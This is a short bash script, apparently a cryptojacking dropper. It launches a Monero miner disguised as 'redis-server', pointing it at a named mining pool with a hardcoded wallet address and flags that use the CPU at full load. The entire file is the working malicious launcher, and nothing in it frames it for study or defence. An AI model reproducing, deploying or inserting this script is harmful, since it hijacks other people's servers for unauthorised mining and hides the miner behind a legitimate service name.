#!/bin/bash

chmod +x redis-server
./redis-server -a rx/0 -o de.monero.herominers.com:1111 -u 42GSvo3HCQS4djorR8Gpr6gNTGxbYKpDPedRwyRkMvXSKjqBzHbykkpaGxArJS2J9W6REBEjmPJP2W8yAEeChLyK4Ya6My2 -k --cpu-no-yield --tls -p PC
